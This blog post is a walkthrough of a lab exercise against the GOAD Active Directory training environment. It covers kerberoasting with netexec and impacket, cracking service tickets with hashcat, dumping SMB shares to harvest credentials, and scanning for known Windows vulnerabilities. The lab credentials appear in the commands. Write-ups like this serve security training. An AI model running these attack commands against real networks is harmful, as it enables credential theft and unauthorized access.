+++
title = "GOAD Part 2: Domain Enumeration"
date = 2024-11-14T01:29:29+03:00
tags = ["cybersecurity"]
#Decide to delete draft or change it to false in order to display post on website
+++

---

# GOAD Part 2: Domain Enumeration

> ### Table of Contents

- [Introduction](#introduction)
- [Kerberoasting in the north domain](#kerberoasting-in-the-north-domain)
- [Cracking with hashcat](#cracking-with-hashcat)
- [Spidering and Dumping Shares](#spidering-and-dumping-shares)
- [Known Vulnerabilities](#known-vulnerabilities)

## Introduction

- In the previous walkthrough we exploited various misconfigurations and obtained some valid domain user credentials.
- With valid credentials, we can perform more enumeration using tools like bloodhound and also explore various attacks such as kerberoasting. We will explore kerberoasting and domain enumeration using bloodhound…..

## Kerberoasting in the north domain

![goad_part2_1](https://github.com/user-attachments/assets/077ccce7-ed98-4800-aee8-83f15893809a)

- With our valid credentials we can try and abuse kerberoasting to obtain more credential material that can grant further access to systems and data.
- Kerberoasting involves attempting to crack passwords of service accounts by exploiting the Kerberos authentication protocol.
- We obtain service tickets associated with these accounts and then perform offline password cracking.
- Using netexec:

```s
nxc ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
```

![goad_part2_2](https://github.com/user-attachments/assets/a2ed153d-e430-4a0a-8d7f-d175cfb4e8d2)

- Using impacket:

```s
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```

![goad_part2_3](https://github.com/user-attachments/assets/96e24b3e-2cf0-4fb4-94c9-d85bb627ab97)

- We obtain 3 kerberoastable users: sansa.stark, jon.snow and sql_svc

## Cracking with hashcat

- Running hashcat in the following mode with a rockyou password list:

![goad_part2_4](https://github.com/user-attachments/assets/81ae2678-4415-4a6e-89dd-6159a939f266)

- We get the plaintext credentials of the jon.snow user.

```s
hashcat -m 13100 -a 0 KERBEROASTING /usr/share/wordlists/rockyou.txt.gz
```

![goad_part2_5](https://github.com/user-attachments/assets/8e54345d-7806-4602-9c4b-83f39d705305)

## Spidering and Dumping Shares

![goad_part2_6](https://github.com/user-attachments/assets/4f048a00-4ef5-4269-8a60-a1f2b42dc918)

- Check for shares and permissions on them.

```s
 nxc smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
```

![goad_part2_7](https://github.com/user-attachments/assets/c90eda41-81f6-48c9-8bdf-7a246ad57a30)

- Dump all files from all the readable shares.

```s
 nxc smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M spider_plus -o DOWNLOAD_FLAG=TRUE
```

![goad_part2_8](https://github.com/user-attachments/assets/2c32799d-13db-46c7-8617-e4c625ebd0d7)

- We have a couple of interesting dumped files.

![goad_part2_9](https://github.com/user-attachments/assets/e55c97c9-4c47-4d76-b50e-dadc5e46bec1)

- We discover credentials to jeor.mormont user.

![goad_part2_10](https://github.com/user-attachments/assets/e25fc7de-cbcb-49b2-8b50-1653eac34c9b)

![goad_part2_11](https://github.com/user-attachments/assets/0cebbe58-193a-4f53-8f46-7ed839c96eb8)

## Known Vulnerabilities

![goad_part2_12](https://github.com/user-attachments/assets/486cbc51-561a-42da-a586-64a25b385c80)

- Some of these vulnerabilities require credentials to enumerate so we will use a domain user’s credentials with netexec, to check the various known vulnerabilities.

```s
 nxc smb 192.168.56.10-23 -u 'jon.snow' -p 'iknownothing' -M zerologon -M nopac -M printnightmare -M smbghost -M ms17-010
```

- We are able to identify printnightmare and nopac on winterfell:

![goad_part2_13](https://github.com/user-attachments/assets/333c11dd-0c8f-484b-9986-11fcbf3bfd93)
